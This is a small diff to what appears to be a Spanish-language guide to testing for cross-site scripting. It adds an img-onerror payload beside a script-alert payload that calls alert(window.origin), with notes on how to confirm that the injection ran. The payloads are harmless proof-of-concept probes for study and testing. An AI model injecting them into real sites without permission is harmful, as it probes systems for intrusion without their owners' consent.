@@ -25,6 +25,10 @@
 <script>alert(window.origin)</script>
 ```
 
+```html
+<img src="" onerror=alert(window.origin)>
+```
+
 🔹 Se debería ejecutar el código una vez ingresado el payload o cuando se actualice la página.<br />
 🔹 Se confirma mirando el código fuente, en el que debería verse el payload.<br />
 
